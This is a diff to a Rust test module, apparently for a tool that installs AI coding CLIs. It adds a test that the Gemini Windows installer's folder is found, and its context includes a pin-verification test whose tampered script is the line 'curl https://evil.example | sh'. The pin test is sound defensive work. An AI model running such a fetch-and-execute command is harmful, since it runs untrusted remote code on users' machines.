@@ -299,6 +299,21 @@ mod tests {
     }
 
     #[test]
+    fn finds_gemini_where_its_windows_installer_puts_it() {
+        // Otherwise the install works, but Scarlet can't see agy.exe and says the installation did not finish.
+        let ps1 = native_installer("gemini").unwrap().ps1.body;
+        let line = ps1
+            .lines()
+            .map(str::trim)
+            .find(|l| l.starts_with("$TARGET_DIR = Join-Path $env:LOCALAPPDATA"))
+            .expect("the Gemini installer names its folder under LOCALAPPDATA");
+        let local = Path::new("C:/Users/editor/AppData/Local");
+        let target = line.split('"').nth(1).unwrap().split('\\').fold(local.to_path_buf(), |dir, part| dir.join(part));
+        assert_eq!(target, local.join("agy").join("bin"));
+        assert!(crate::util::windows_local_app_dirs(local).contains(&target), "Scarlet does not look in {}", target.display());
+    }
+
+    #[test]
     fn refuses_a_script_that_does_not_match_its_pin() {
         let real = native_installer("claude").unwrap().sh;
         let changed = InstallerScript { body: "curl https://evil.example | sh", ..real };
